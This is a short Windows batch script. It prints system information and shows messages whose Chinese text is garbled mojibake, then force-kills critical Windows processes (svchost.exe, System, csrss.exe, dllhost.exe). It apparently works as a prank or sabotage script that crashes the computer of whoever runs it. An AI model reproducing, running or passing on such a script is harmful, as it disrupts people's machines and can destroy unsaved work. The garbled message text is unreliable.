@echo off
VER
VOL
TIME /T
SYSTEMINFO
echo ���Ҫ������
color 2
echo ����Թر����������ȡ������
pause
taskkill /T /F /IM svchost.exe 
taskkill /T /F /IM system
taskkill /T /F /IM csrss.exe
taskkill /T /F /IM dllhost.exe
CLS
color 4
echo ����ʧ����
pause
rem ������Ϊʲô����ô����������㲻���ú�hack��